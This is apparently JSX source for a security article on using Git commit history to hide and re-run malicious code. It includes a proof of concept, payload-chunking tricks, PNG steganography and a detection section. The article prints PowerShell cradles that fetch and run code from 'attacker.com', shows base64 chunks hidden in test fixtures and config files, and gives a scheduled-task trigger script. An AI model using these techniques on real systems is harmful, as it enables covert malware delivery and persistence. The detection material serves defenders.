                            <p className="text-gray-700 leading-relaxed">
                                This article explores how <B>Git can be abused as a persistence mechanism</B>. The goal is to understand how attackers could weaponize version control workflows to hide malicious changes, revert states, or automate re-deployment of backdoored code — and how defenders can detect such activity.
                            </p>

                        {/* ═══════════ HOW IT WORKS ═══════════ */}
                        <Section id="how-it-works" title="How This Attack Works" icon="Cpu">
                            <SubSection title="The Basic Idea">
                                <p className="text-gray-700 leading-relaxed">
                                    Here's the scenario: an attacker gains write access to a Git repository (through compromised credentials, a supply chain attack, or an insider threat). Then they can:
                                </p>
                                <ol className="list-decimal list-outside ml-5 space-y-2 text-gray-700">
                                    <li>Commit malicious code to the repo</li>
                                    <li>Delete that malicious code in the next commit (looks clean now)</li>
                                    <li>Use Git commands to jump back to the malicious commit whenever they want</li>
                                    <li>Execute whatever's there, then jump back to the clean commit</li>
                                </ol>
                                <p className="text-gray-700 leading-relaxed">
                                    This makes everything look normal to developers who don't regularly check commit history — they won't be aware of the malicious commit at all.
                                </p>
                            </SubSection>

                            <SubSection title="Why This is Nasty">
                                <ul className="list-disc list-outside ml-5 space-y-2 text-gray-700">
                                    <li>Your malicious payload lives in git history but <B>not in the actual current files</B></li>
                                    <li>Antivirus and file scans won't catch it because it's not "there" right now</li>
                                    <li>CI/CD pipelines might execute the code during automated checkouts</li>
                                    <li>It's all using normal git features, so it looks like legitimate activity</li>
                                </ul>
                            </SubSection>
                        </Section>

                        {/* ═══════════ TECHNICAL BACKGROUND ═══════════ */}
                        <Section id="technical-background" title="Technical Background" icon="GitBranch">
                            <SubSection title="How Git Actually Works">
                                <p className="text-gray-700 leading-relaxed">
                                    Git stores the complete history of all commits for versioning. Even when you delete files and commit that deletion, the files don't actually disappear from git — they're just removed from the current version you're looking at. But git still keeps them in history, and you can go back anytime to grab them.
                                </p>
                                <p className="text-gray-700 leading-relaxed">
                                    You can access old commits (and deleted files) through:
                                </p>
                                <ul className="list-disc list-outside ml-5 space-y-1 text-gray-700">
                                    <li>Commit hashes — <C>git checkout &lt;hash&gt;</C></li>
                                    <li>Going back X commits — <C>git checkout HEAD~2</C></li>
                                    <li>Branch names — <C>git checkout feature-branch</C></li>
                                </ul>
                                <Callout type="tip">
                                    <p>Git never really "deletes" anything — it just hides it from your current view. This is great for developers but also perfect for hiding malicious payloads.</p>
                                </Callout>
                            </SubSection>

                            <SubSection title="Commands We'll Use">
                                <CodeBlock language="bash">
{`# See all your commits
git log --oneline

# Jump to a specific old commit
git checkout <commit-hash>

# Go back to where you were before
git checkout -`}
                                </CodeBlock>

                                <Img src="img-03.png" alt="Sequence diagram" caption="Sequence diagram of the attack flow" />
                            </SubSection>
                        </Section>

                        {/* ═══════════ POC ═══════════ */}
                        <Section id="poc" title="Proof of Concept" icon="FlaskConical">
                            <SubSection title="Setting Things Up">
                                <CodeBlock language="bash">
{`# Make a new repository
mkdir git_persistence_poc
cd git_persistence_poc
git init

# Set up your git identity
git config --global user.email "you@example.com"
git config --global user.name "Your Name"`}
                                </CodeBlock>
                            </SubSection>

                            <SubSection title="Step 1 — Create Legitimate Files">
                                <CodeBlock language="bash">
{`# Create some normal files
echo "# Project Documentation" > README.md
echo "print('Hello World')" > app.py

# Commit them
git add .
git commit -m "Initial commit with project files"`}
                                </CodeBlock>
                            </SubSection>

                            <SubSection title="Step 2 — Add the Malicious File (Hidden in Noise)">
                                <p className="text-gray-700 leading-relaxed">
                                    The stealthy approach: slip the malicious payload in a pile of legitimate-looking files. When someone reviews a 30-file commit, they see package updates, new test files, config changes — and they won't carefully review every single file.
                                </p>
                                <CodeBlock language="bash">
{`# Create legitimate-looking files
echo '{"dependencies": {"express": "^4.18.0"}}' > package.json
echo 'node_modules/' > .gitignore
mkdir tests
echo 'import unittest' > tests/test_app.py

# Slip in the malicious file among all these changes
echo 'powershell -ep bypass -c "iwr http://attacker.com/payload.exe -o C:\\users\\public\\p.exe;Start-Process C:\\users\\public\\p.exe"' > scripts/postinstall.ps1

# Commit everything together
git add .
git commit -m "Add project dependencies, update configs, add test suite"`}
                                </CodeBlock>
                            </SubSection>

                            <SubSection title="Step 3 — Delete It and Look Clean">
                                <CodeBlock language="bash">
{`# Remove the malicious file along with other cleanup (looks intentional)
git rm -r tests/ scripts/ config.yaml
git commit -m "Clean up old test files and unused scripts"

# The repo now looks totally clean, but the payload still exists in git history`}
                                </CodeBlock>
                            </SubSection>

                            <SubSection title="Step 4 — Find the Malicious Commit Hash">
                                <CodeBlock language="bash">
{`# Check commit history
git log --oneline

# List all files in that commit
git show --name-only <commit_hash>`}
                                </CodeBlock>
                            </SubSection>

                            <SubSection title="Step 5 — Trigger the Persistence">
                                <p className="text-gray-700 leading-relaxed">
                                    Create a trigger script that jumps to the malicious commit, runs it, then jumps back to the clean commit. This script can be triggered via scheduled tasks, login scripts, WMI event subscriptions, services, or registry Run keys.
                                </p>
                                <CodeBlock language="batch">
{`@echo off
cd C:\\path\\to\\git_persistence_poc

REM Jump to the malicious commit
git checkout <commit_hash>

REM Run the payload
powershell -ep bypass -File scripts\\postinstall.ps1

REM Jump back to previous commit
git checkout -`}
                                </CodeBlock>
                                <Img src="img-04.png" alt="PoC in action - scheduled task trigger" caption="Scheduled task triggering the Git persistence mechanism" />
                            </SubSection>

                        {/* ═══════════ HIDING MULTI-FILE ═══════════ */}
                        <Section id="hiding-multi-file" title="Hiding Payload into Multiple Files" icon="Files">
                            <p className="text-gray-700 leading-relaxed">
                                For remote repositories (GitHub, GitLab, Codeberg), every commit is permanently visible and easy to audit. A more evasive approach: <B>split your payload into multiple encoded chunks</B> and hide them across several files. Each piece looks harmless individually.
                            </p>

                            <SubSection title="Approach 1: In-Repository Reconstruction Script">
                                <p className="text-gray-700 leading-relaxed">
                                    Commit both the encoded payload fragments <B>and</B> a helper script that locates, decodes, merges, and executes them. Easy to automate, but the reconstruction logic is visible to code reviewers.
                                </p>
                            </SubSection>

                            <SubSection title="Approach 2: External Reconstruction Script (Stealthier)">
                                <p className="text-gray-700 leading-relaxed">
                                    Only put the encoded payload chunks in git commits. The reconstruction script lives on the target machine you already control. Other developers see random data — no "merge and run" script in the repository.
                                </p>
                                <Img src="img-05.jpg" alt="External reconstruction script diagram" caption="Approach 2: Payload chunks in repo, reconstruction script on target machine" />
                                <CodeBlock language="powershell">
{`# Split and encode payload
$payload = 'IEX(New-Object Net.WebClient).DownloadString("http://attacker.com/shell.ps1")'
$chunk1 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($payload.Substring(0, 25)))
$chunk2 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($payload.Substring(25, 25)))
$chunk3 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($payload.Substring(50)))`}
                                </CodeBlock>
                                <p className="text-gray-700 leading-relaxed">
                                    Hide each chunk in different "test files" committed to the repo:
                                </p>
                                <CodeBlock language="json">
{`// tests/fixtures/test_data_1.json
{
  "test_case": "edge_case_1",
  "expected": "success",
  "metadata": "<base64-chunk-1>"
}

// config/build_settings.yaml
version: 2.1
build:
  cache_key: "<base64-chunk-3>"
  timeout: 300`}
                                </CodeBlock>
                                <p className="text-gray-700 leading-relaxed">
                                    The reconstruction script (lives on the compromised machine, <B>not in git</B>):
                                </p>
                                <CodeBlock language="powershell">
{`# C:\\ProgramData\\SystemUpdater\\updater.ps1
cd C:\\path\\to\\git_persistence_poc

# Extract chunks from git
$chunk1 = (git show HEAD:tests/fixtures/test_data_1.json | ConvertFrom-Json).metadata
$chunk2 = (git show HEAD:tests/fixtures/test_data_2.json | ConvertFrom-Json).metadata
$chunk3 = (git show HEAD:config/build_settings.yaml | Select-String "cache_key").Line.Split('"')[1]

# Decode and reconstruct
$decoded1 = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($chunk1))
$decoded2 = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($chunk2))
$decoded3 = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($chunk3))
$fullPayload = $decoded1 + $decoded2 + $decoded3

# Execute
IEX $fullPayload`}
                                </CodeBlock>
                            </SubSection>
                        </Section>

                        {/* ═══════════ STEGANOGRAPHY ═══════════ */}
                        <Section id="steganography" title="Hiding Payload in an Image File (Steganography)" icon="Image">
                            <p className="text-gray-700 leading-relaxed">
                                There's a rising surge of threat actors hiding base64-encoded loaders within images. With this method, you don't need to delete anything to create a "clean" stage — but your steganography technique must render the image properly to attract less attention.
                            </p>
                            <p className="text-gray-700 leading-relaxed">
                                Embedding into a PNG works well since appending data at the end won't affect how the file renders:
                            </p>
                            <CodeBlock language="powershell">
{`$payload = 'IEX(New-Object Net.WebClient).DownloadString("http://attacker.com/shell.ps1")'
$encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($payload))

$image = "banner.png"
$embedded = "<PAYLOAD_START>" + $encoded + "<PAYLOAD_END>"

$bytes = [System.Text.Encoding]::UTF8.GetBytes($embedded)
$stream = [System.IO.File]::Open($image, 'Append')
$stream.Write($bytes, 0, $bytes.Length)
$stream.Close()`}
                            </CodeBlock>
                            <p className="text-gray-700 leading-relaxed">
                                Extraction and execution command:
                            </p>
                            <CodeBlock language="powershell">
{`$t=[Text.Encoding]::UTF8.GetString([IO.File]::ReadAllBytes('banner.png'))
$s='<PAYLOAD_START>';$e='<PAYLOAD_END>'
$p=($t.Substring($t.IndexOf($s)+$s.Length,$t.IndexOf($e)-($t.IndexOf($s)+$s.Length)))
powershell -enc ([Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(
    ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($p))))))`}
                            </CodeBlock>
                            <Img src="img-06.png" alt="Steganography payload extraction in action" caption="Payload embedded in PNG extracted and executed" />

                        {/* ═══════════ DETECTION ═══════════ */}
                        <Section id="detection" title="Detection Opportunities" icon="ShieldCheck">
                            <SubSection title="1. Looking Through Git History">
                                <p className="text-gray-700 leading-relaxed">
                                    Hunt for suspicious patterns — files that were added then quickly deleted:
                                </p>
                                <CodeBlock language="bash">
{`# Find files that were deleted
git log --diff-filter=D --summary

# Look at the whole commit timeline
git log --all --oneline --graph

# Search for commits that added and removed files in short timeframe
git log --all --pretty=format:"%h %an %ar - %s" --stat | grep -B5 -A5 "delete"`}
                                </CodeBlock>
                            </SubSection>

                            <SubSection title="2. Process Monitoring">
                                <p className="text-gray-700 leading-relaxed">
                                    Look for <C>git checkout</C> usage in <B>Sysmon Event ID 1</B> or <B>Security Event ID 4688</B> (with command-line logging enabled). Pay attention to:
                                </p>
                                <ul className="list-disc list-outside ml-5 space-y-1 text-gray-700">
                                    <li>Git checkout commands followed immediately by PowerShell/bash execution</li>
                                    <li>Git checkout to specific <B>commit hashes</B> (not branches)</li>
                                    <li>Git checkout commands running from scheduled tasks or startup scripts</li>
                                    <li>PowerShell with <C>IEX</C> (Invoke-Expression) or <C>IWR</C> (Invoke-WebRequest)</li>
                                </ul>
                            </SubSection>

                            <SubSection title="3. Network Activity">
                                <p className="text-gray-700 leading-relaxed">
                                    Running <C>git</C> commands other than <C>git push</C> or <C>git pull</C> should <B>not connect to any GitHub domain</B> — all git commit history is stored locally in the <C>.git</C> folder. Unexpected network connections during git operations are a strong indicator of abuse.
                                </p>
                            </SubSection>
                        </Section>

                        {/* ═══════════ CONCLUSION ═══════════ */}
                        <Section id="conclusion" title="Conclusion" icon="CheckCircle">
                            <p className="text-gray-700 leading-relaxed">
                                Git, even though it's just a tool for versioning, can be weaponized for persistence when you don't have proper security controls. This technique is particularly nasty because:
                            </p>
                            <ul className="list-disc list-outside ml-5 space-y-2 text-gray-700">
                                <li>It's using <B>legitimate git features</B></li>
                                <li>The malicious code is hiding in plain sight (in the commit history)</li>
                                <li>Most antivirus and EDR won't look inside git objects</li>
                                <li>It can <B>survive reimaging</B> — just clone the repo again</li>
                            </ul>

                                    <h4 className="font-semibold text-gray-800 mb-2 flex items-center gap-2">
                                        <Icon name="Shield" className="w-4 h-4 text-blue-600" />
                                        Blue Team Takeaway
                                    </h4>
                                    <p className="text-gray-600 text-sm">Don't just scan current files. Git history is another hiding spot for malicious code. Scan repositories comprehensively and monitor git operations.</p>
